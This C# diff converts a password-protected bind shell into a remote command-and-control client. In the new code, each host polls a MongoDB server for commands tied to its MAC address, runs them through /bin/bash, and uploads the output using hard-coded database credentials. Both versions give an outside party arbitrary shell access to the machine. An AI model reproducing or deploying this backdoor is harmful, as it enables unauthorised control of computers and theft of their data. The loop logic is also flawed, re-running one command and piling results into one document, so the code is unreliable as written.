@@ -6,6 +6,8 @@ using System.Threading;
 using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using MongoDB.Driver;
+using MongoDB.Bson;
 
 namespace ProcessAsyncStreamSamples
 {
@@ -15,110 +17,78 @@ namespace ProcessAsyncStreamSamples
         private static StringBuilder sendOutput = null;
         private static StringBuilder senderrOutput1 = null;
 
-        public static void CreateTerminalprocess(string SERVER_IP, int port, string pass)
+        public static void CreateTerminalprocess(string databaseip, string databaseport, string mac)
         {
-            //---listen at the specified IP and port no.---
-            IPAddress localAdd = IPAddress.Parse(SERVER_IP);
-            TcpListener listener = new TcpListener(localAdd, port);
-            Console.WriteLine("Listening...");
-            listener.Start();
-            //---incoming client connected---
-            TcpClient client = listener.AcceptTcpClient();
-            //---get the incoming data through a network stream---
-            NetworkStream nwStream = client.GetStream();
-            byte[] bytesToRead1 = new byte[client.ReceiveBufferSize];
-            int bytesRead1 = nwStream.Read(bytesToRead1, 0, client.ReceiveBufferSize);
-            string password = Encoding.ASCII.GetString(bytesToRead1, 0, bytesRead1);
-            if (password != pass)
+            while (true)
             {
-                byte[] outputbuf2 = ASCIIEncoding.ASCII.GetBytes("ur pass  incorrect");
-                nwStream.Write(outputbuf2, 0, outputbuf2.Length);
-                client.Close();
-                listener.Stop();
-                return;
-            }
-            byte[] outputbuf3 = ASCIIEncoding.ASCII.GetBytes("password correct");
-            nwStream.Write(outputbuf3, 0, outputbuf3.Length);
-            Process Terminalprocess = new Process();
-            Terminalprocess.StartInfo.FileName = "/bin/bash";
-            Terminalprocess.StartInfo.UseShellExecute = false;
-            Terminalprocess.StartInfo.RedirectStandardOutput = true;
-            Terminalprocess.StartInfo.RedirectStandardError = true;
-            sendOutput = new StringBuilder();
-            senderrOutput1 = new StringBuilder();
-            Terminalprocess.OutputDataReceived += SendOutputHandler;
-            Terminalprocess.ErrorDataReceived += SenderrOutputHandler1;
-            Terminalprocess.StartInfo.RedirectStandardInput = true;
-            Terminalprocess.Start();
-
-            StreamWriter StreamWriter = Terminalprocess.StandardInput;
-            Terminalprocess.BeginOutputReadLine();
-            Terminalprocess.BeginErrorReadLine();
-            String inputText;
-            try
-            {
-                do
+                string inputText = client.infosender.Clientinfosender(mac, databaseip, databaseport);
+                if (inputText != null)
                 {
-                    byte[] bytesToRead = new byte[client.ReceiveBufferSize];
-                    int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
-                    Console.WriteLine("Received : " + Encoding.ASCII.GetString(bytesToRead, 0, bytesRead));
-                    inputText = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
-                    if (inputText == "mykill" || inputText == "")
+                    Process Terminalprocess = new Process();
+                    Terminalprocess.StartInfo.FileName = "/bin/bash";
+                    Terminalprocess.StartInfo.UseShellExecute = false;
+                    Terminalprocess.StartInfo.RedirectStandardOutput = true;
+                    Terminalprocess.StartInfo.RedirectStandardError = true;
+                    sendOutput = new StringBuilder();
+                    senderrOutput1 = new StringBuilder();
+                    Terminalprocess.OutputDataReceived += SendOutputHandler;
+                    Terminalprocess.ErrorDataReceived += SenderrOutputHandler1;
+                    Terminalprocess.StartInfo.RedirectStandardInput = true;
+                    Terminalprocess.Start();
+                    StreamWriter StreamWriter = Terminalprocess.StandardInput;
+                    Terminalprocess.BeginOutputReadLine();
+                    Terminalprocess.BeginErrorReadLine();
+                    BsonDocument doc = new BsonDocument();
+                    while(true)
                     {
-                        byte[] outputbuf2 = ASCIIEncoding.ASCII.GetBytes("good bye");
-                        nwStream.Write(outputbuf2, 0, outputbuf2.Length);
-                        StreamWriter.Close();
-                        Terminalprocess.Kill();
-                        Terminalprocess.Close();
-                        client.Close();
-                        listener.Stop();
-                        break;
-                    }
-                    sendOutput.Clear();
-                    senderrOutput1.Clear();
-                    try
-                    {
-                        StreamWriter.WriteLine(inputText);
+                        doc.Add(new BsonElement("name", "client"));
+                        doc.Add(new BsonElement("command", inputText));
+                        sendOutput.Clear();
+                        senderrOutput1.Clear();
+                        try
+                        {
+                            StreamWriter.WriteLine(inputText);
 
-                    }
-                    catch
-                    {
-                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes("good bye");
-                        nwStream.Write(outputbuf, 0, outputbuf.Length);
-                        StreamWriter.Close();
-                        Terminalprocess.Kill();
-                        Terminalprocess.Close();
-                        client.Close();
-                        listener.Stop();
-                        break;
-                    }
-                    Thread.Sleep(1500);
-                    if (!String.IsNullOrEmpty(sendOutput.ToString()))
-                    {
-                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes(sendOutput.ToString());
-                        nwStream.Write(outputbuf, 0, outputbuf.Length);
-                    }
-                    if (!String.IsNullOrEmpty(senderrOutput1.ToString()))
-                    {
+                        }
+                        catch
+                        {
+                            var dbClient = new MongoClient("mongodb://client:client99@" + databaseip + ":" + databaseport + "/admin");
+                            ////create collection
+                            IMongoDatabase respondsdatabase = dbClient.GetDatabase("responds");
+                            ////creat Mac object
+                            var respondscollection = respondsdatabase.GetCollection<BsonDocument>(mac);
+                            doc.Add(new BsonElement("respond", "i cant run ur command!"));
+                            respondsdatabase.DropCollection(mac);
+                            respondscollection.InsertOne(doc);
+                            doc.Clear();
+                            StreamWriter.Close();
+                            Terminalprocess.Kill();
+                            Terminalprocess.Close();
+                            break;
+                        }
                         Thread.Sleep(1500);
-                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes(senderrOutput1.ToString());
-                        nwStream.Write(outputbuf, 0, outputbuf.Length);
-                    }
-                    if (String.IsNullOrEmpty(sendOutput.ToString()) && String.IsNullOrEmpty(senderrOutput1.ToString()))
-                    {
-                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes("ur command havent any output");
-                        nwStream.Write(outputbuf, 0, outputbuf.Length);
-                    }
-                } while (true);
+                        if (!String.IsNullOrEmpty(sendOutput.ToString()))
+                        {
+                            doc.Add(new BsonElement("respond", sendOutput.ToString()));
 
-            }
-            catch
-            {
-                StreamWriter.Close();
-                Terminalprocess.WaitForExit();
-                Terminalprocess.Close();
-                client.Close();
-                listener.Stop();
+                        }
+                        if (!String.IsNullOrEmpty(senderrOutput1.ToString()))
+                        {
+                            Thread.Sleep(1500);
+                            doc.Add(new BsonElement("respond", senderrOutput1.ToString()));
+                        }
+                        if (String.IsNullOrEmpty(sendOutput.ToString()) && String.IsNullOrEmpty(senderrOutput1.ToString()))
+                        {
+                            doc.Add(new BsonElement("respond", "ur command havent any output"));
+                        }
+                        var dbClient1 = new MongoClient("mongodb://client:client99@" + databaseip + ":" + databaseport + "/admin");
+                        IMongoDatabase respondsdatabase1 = dbClient1.GetDatabase("responds");
+                        var respondscollection1 = respondsdatabase1.GetCollection<BsonDocument>(mac);
+                        respondsdatabase1.DropCollection(mac);
+                        respondscollection1.InsertOne(doc);
+                    }
+
+                }
             }
 
         }
